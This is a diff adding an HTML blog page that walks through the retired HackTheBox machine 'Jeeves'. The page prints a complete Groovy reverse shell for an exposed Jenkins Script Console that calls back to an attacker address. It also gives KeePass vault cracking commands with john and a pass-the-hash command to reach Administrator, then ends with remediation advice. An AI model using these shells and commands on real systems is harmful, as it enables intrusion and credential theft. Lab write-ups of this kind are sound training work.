@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Jeeves: open Jenkins console, cracked KeePass, hash to admin — Lucky Thandel</title>
+<meta name="description" content="Unauthenticated Jenkins script console to foothold, a KeePass vault cracked with john, and an NTLM hash walked straight to Administrator. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-13 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Jeeves: open Jenkins console, cracked KeePass, hash to admin</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Jeeves is a retired HackTheBox easy Windows machine themed around enterprise automation. Synopsis: an unauthenticated Jenkins script console for foothold, a KeePass vault cracked with john, and an NTLM hash walked to Administrator.</p>
+<h2><span class="amber">$</span> Enumeration — management consoles</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: spot Jenkins plus friends</span>
+nmap -sC -sV -oN jeeves.nmap 10.10.10.63</pre>
+<p>IIS, SMB, and a Jenkins server with its Script Console reachable without login. CI consoles execute code by design — check unauthenticated access on every management UI early.</p>
+<h2><span class="amber">$</span> Foothold — Groovy console RCE</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># jenkins console: Groovy reverse shell</span>
+String host=&quot;10.10.14.23&quot;;int port=4444;String cmd=&quot;cmd.exe&quot;;
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}</pre>
+<p>Paste into Manage Jenkins → Script Console with a listener up: shell as the kohsuke service user. No CVE — intended functionality left facing the network.</p>
+<h2><span class="amber">$</span> Lateral data — KeePass vault</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: exfiltrate, crack, reuse hash</span>
+# on target: C:\Users\kohsuke\Documents\CEH.kdbx -&gt; download it
+keepass2john CEH.kdbx &gt; keepass.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
+# vault opens -&gt; Administrator NTLM hash
+pth-winexe -U 'Administrator%&lt;hash&gt;' //10.10.10.63 cmd</pre>
+<p>The vault opens to an Administrator NTLM hash — pass-the-hash straight to local Administrator, and both flags fall. Vaults on-disk are only as safe as their master passwords. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Attacking IIS and SMB first (the Jenkins console is the glowing door) and trying to crack the hash before opening the vault (order matters: vault first, then hash).</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Authenticate and network-restrict CI consoles, never store vaults on shared hosts with weak master passwords, and treat NTLM hash exposure as full compromise. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
